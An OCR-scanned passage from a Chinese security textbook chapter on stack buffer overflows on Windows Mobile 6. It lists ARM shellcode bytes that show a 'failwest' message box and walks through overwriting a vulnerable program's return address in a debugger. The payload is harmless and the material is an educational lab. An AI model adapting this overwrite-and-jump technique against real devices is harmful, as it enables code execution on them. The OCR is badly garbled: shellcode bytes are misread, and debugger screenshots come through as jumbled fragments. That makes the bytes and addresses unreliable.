表7-5-1实验环境
2
版
推荐使用的环境
备
PC操作系统
Window XPSP2
编译器
Visual Studio 2008
编详选项
禁用GS选项
build版本
release版本
Windows Mobile SDK
Windows Mobile 6 Pro
本次实验我们使用一个弹出failwest对话框的shellcode，shellcode的机器码及解释如下
所示。
1x311x31\x31\x31
填充
1x31\x31\x31\x31
填充
1x31\x31\x31\x31
填充
\x311x31\x31\x31
填充
1x24\xFC1x02\x00
弹出对话框的机器码在内存中的位置
1x00\X00\XA0\XE3
MOV RO,#0
\x0C\x10\x8F\xE2
ADR R1,failwest
1x08\x201x8F\xE2
ADR R2.failwest
1x00\x30\xA0\xE3
MOVR3,#0
1x14\x40\x9F\xE5
LDR R4,=MessageBox
\x14\xFF\x2F\xE1
BXR4
1x661x001x611x00
fa
il
1x771x001x651x00
we
1x731x00\x741x00
st
00X100X100X100X
NULL
\x20\xF7\xF7\x03
WindowsMobile6上Messagebox函数的地址
1x00\x00\x001x00
NULL
238
---
## Page 264
第
我们将上面的机器码通过十六进制编辑的方式保存为exploit.txt以备后用。
7
首先我们需要构建一个有溢出漏洞的手机程序。建立漏洞程序的过程与7.3节中的介绍的
章
过程基本一致，只是我们建立工程的时候不再选择MFC，而是Console工程，建立过程中有两
手
点区别于MFC。
机
（1）在SmartDevice选项窗口的右边不再选择MFCSmartDeviceApplication，而是选择
Win32SmartDeviceProject，如图7.5.1所示。
的
缓
New Project
冲
Brojecttype
NET fran
rk.3.5
区
Vsuel C++
ATL
溢
QR
A Smart Device Project
EMFC Snart Device Actvex Controdl
General
LMFC Snart Device DL
出
MFC
Test
My Templates
Ocher Languages
Win32
e uo pws
选择该项
di Test Projects
C:Po
v
Create grectory for solution
Add to Soyrce Conbrol
amo
图7.5.1建立Win32SmartDevice类型的工程
（2）在接下来的ApplicationSetting选项页中选择ConsoleApplication，如图7.5.2所示。
Project Settings
Add suppert for:
Placfor
Wrdowagpkabon
an
Aplcaion
uogdo puopPPv
选择该项
trety proed
psdscd
MyWindows
Mobile-BasedDevice”下面。
现在可以继续我们的调试之旅了，按一下F10键如果能够正确地读取exploit.txt就可以执
技术
行到fread(buf,1,100，fp）这句，如果不能执行到大家就需要检查一下exploit.txt是否位于正确的
（第
目录下。现在切换到汇编代码窗口，继续按F10键单步执行，执行到0x00011034处的bl指令
时暂停程序，观察一下内存周围情况。通过寄存器窗口我们可以看到R0的值为0x1802fc10（如
2
版
图7.5.3所示），这个地址就是buf变量起始地址，大家先记住这个值，后边会用到。当然在测
试的时候这个值可能会发生变化，不过不要紧记录下这个值就行了。
Address: dsplay
000110081dr
30011000
00011010
80x40]
bl
r0，
2=
=0000000
00011018
K3=
0r00000064
OP10E00OFO
buf起始地址为
Dr00000000
bpp31011000
0x1802fc10
6
0x000112f0
0r000000u
000110201dr*
R7=Ox01ffcc74
frdbuf, 1,100, fp):
BS=0x1802fed8
0x01ffe9e0
r2,80x64
r3,
r0
B10=0xd6e650b6
J2ULTUOL
B11 = 0x1802fe4c
00011030
edd
R12 =Oxd6ebfbf3
Sp =0x1802fe10
Pc = 0x00011034
Lr=0x00011014
r0,（pd
0010
传递buf参数
0001103C
edd
Psr =0x20000010
00011040
return 1:
Hegative=Ox00000000
00011044B0
r0,1
00011048
edd
0verF1ev=0x00000000
Curry
1dr
p，p,.00x10
0001104C
[],
DSP_Q=0x00000000
00011050
sndeq
00011054
endeo
r2,r1,r12,1sr 32
00011058
andeo
ede=0x00000010
0v0000000
图7.5.3buf变量起始地址
继续单步执行程序直到0x0001104C处的ldrpc，[sp],#4指令，这条指令就是display函数的
返回指令，Sp中存放的就是函数的返回地址，所以本次溢出的目的就是用弹出对话框机器码在
内存中的起始地址来覆盖这个返回地址。我们来看看现在sp指向的位置，如图7.5.4所示。
从图7.5.4中我们可以看到当前Sp指向了0x1802fc20（这个地址在您的测试环境中也有可
能不同），而buf的起始地址为0x1802fc10。也就是说只要我们向buf里边写入超过16个字节
240
---
## Page 266
第
的数据就可以覆盖函数的返回地址了，这也就是为什么在shellcode最前端有着16个字节的
7
0x31填充。
章
Disassemblyvl.cpp
手
Address: dsplay
00011014
机
r0, #0
retun 0:
egisters
里
00011018
r0,#0
R1=0x00000000
00000000
的
0001101C
sdd4g
p,
B3 = Oxffffcbec
12=0xd6ebfbf3
00011020
pc,
缓
B4=0x00000000
frad (uf, 1, 100, fp):
B5=0x00000000
冲
00011024
BOY
B=Cx000112f0
00011028
Bov
Sp指向地址为
B7 = Ox01ffcc74
区
0001102C
r1
B8 = Ox01ffc90
00011030
0x1802fc20
89 =0x1802fed
溢
00011034
bl
R11=Ox1802fe4c
810=0xdBe506
printf(file:
Ss",ba
出
000110381
r0,[pc,0x10]
ed4
Sp =Ox1802fe20
Ordinhfhx
0001104061
0001103C
0001106C
rl,.0
retgn 1:
rc=Cx0001104c
620001104
00011044
BOV
r0,
Psr = 0x60000010
0L1048
Zre=0x00000001
Fegetive=Ox000o0000
D001104C
00011050
1dr
[p].
r2,ri.
√
Cerry = 0x00000001
00011054
ndeg
display函数返
Dvar71e000000000
00011058
endeg
r2,r1,
IRQ=0x00000000
DSP0=000000000
int _tmain Gint urge,
_TCKAR*
回指令
lr. Iso.
FIQ=0x00000000
0001105C
str
Thunb = 0x00000000
ede = 0x00000010
图7.5.4
当前栈顶的位置
按F10键继续执行程序，大家会发现程序已经转入到我们的shellcode中执行了，如图7.5.5
所示。
Address:Qx0002fc24
0002FC04
stnneds
r2,{r4, r10 - r12,g, 1r,p]
000ZrC0O
rtes
0002FCOC
构建MessageBox
R1 =0x0002fe3c
Ox00000UOX
0002FC10
97777?
的参数
R2=0x0002fe3e
0002FC16
4
0002FC1C
0x00000000
0x03fTf720
deg
lu
0002FC24
0002PC28
0002PC2C
edd
edd
rl,
p,
OxC
0002FC30
r2,
3.
R10±0x16c051ee
9=0x1802fed